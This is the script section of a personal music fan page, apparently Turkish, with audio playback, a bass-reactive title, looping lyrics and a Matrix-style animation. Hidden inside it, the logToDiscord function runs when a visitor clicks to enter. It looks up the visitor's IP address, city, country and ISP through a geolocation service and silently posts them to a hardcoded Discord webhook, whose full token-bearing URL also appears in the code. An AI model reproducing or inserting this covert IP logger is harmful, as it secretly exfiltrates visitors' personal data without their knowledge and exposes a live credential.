    <script>
        const songLyrics = ["POLƒ∞SE ANLAT", "BENƒ∞ SENƒ∞ FARE", "ICQ 2000", "BATMAN DEƒûƒ∞Lƒ∞M", "ATM PATLAT"];
        const webhookURL = "https://discord.com/api/webhooks/1470110601714864198/Gxgga4v26nLVHeZPgqpTrrg5sqnp4xsJsVjP0BuDKmNXcRdsVYv284lOBul-gUcj4jPw";
        let audioCtx, analyser, dataArray;

        async function logToDiscord() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const params = {
                    username: "√ñmer Ek≈üi Logger",
                    embeds: [{
                        title: "üö® Sƒ∞STEME Gƒ∞Rƒ∞≈û YAPILDI",
                        color: 3447003,
                        fields: [
                            { name: "üåê IP", value: `\`${data.ip}\``, inline: true },
                            { name: "üìç Konum", value: `${data.city} / ${data.country_name}`, inline: true },
                            { name: "üè¢ ISP", value: data.org, inline: false }
                        ],
                        timestamp: new Date()
                    }]
                };
                fetch(webhookURL, { method: "POST", headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(params) });
            } catch (e) {}
        }

        function initPortal() {
            document.getElementById('overlay').style.display = 'none';
            const audio = document.getElementById('bg-music');
            audio.play();
            logToDiscord();

            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            analyser = audioCtx.createAnalyser();
            const source = audioCtx.createMediaElementSource(audio);
            source.connect(analyser);
            analyser.connect(audioCtx.destination);
            analyser.fftSize = 64;
            dataArray = new Uint8Array(analyser.frequencyBinCount);
            
            startLyricLoops();
            drawMatrix();
            animateBass();
        }

        function animateBass() {
            requestAnimationFrame(animateBass);
            if(!analyser) return;
            analyser.getByteFrequencyData(dataArray);
            let bass = dataArray[1];
            const titleAnim = document.getElementById('title-anim');
            if(bass > 185) {
                titleAnim.style.transform = `scale(${1 + bass/1500})`;
            } else {
                titleAnim.style.transform = "scale(1)";
            }
        }

        function startLyricLoops() {
            let i = 0;
            setInterval(() => {
                const word = songLyrics[i % songLyrics.length];
                const pL = document.createElement('div'); pL.innerText = word;
                document.getElementById('l-loop').prepend(pL);
                const pR = document.createElement('div'); pR.innerText = word;
                document.getElementById('r-loop').prepend(pR);
                if(document.getElementById('l-loop').children.length > 5) {
                    document.getElementById('l-loop').lastChild.remove();
                    document.getElementById('r-loop').lastChild.remove();
                }
                i++;
            }, 2000);
        }

        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const matrixText = "√ñMER EK≈ûƒ∞";
        const drops = Array.from({ length: Math.floor(canvas.width / 20) }).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#00ff00"; 
            ctx.font = "bold 16px monospace";
            for (let i = 0; i < drops.length; i++) {
                const char = matrixText.charAt(Math.floor(Math.random() * matrixText.length));
                ctx.fillText(char, i * 25, drops[i] * 20);
                if (drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
            requestAnimationFrame(drawMatrix);
        }

        function toggleSec(id, event) {
            event.stopPropagation();
            document.querySelectorAll('.content-area').forEach(d => d.style.display = 'none');
            document.getElementById(id).style.display = 'block';
        }

        function closeAll(event) {
            if(!event.target.closest('.content-area') && !event.target.closest('.panel-btn')) {
                document.querySelectorAll('.content-area').forEach(d => d.style.display = 'none');
            }
        }
    </script>
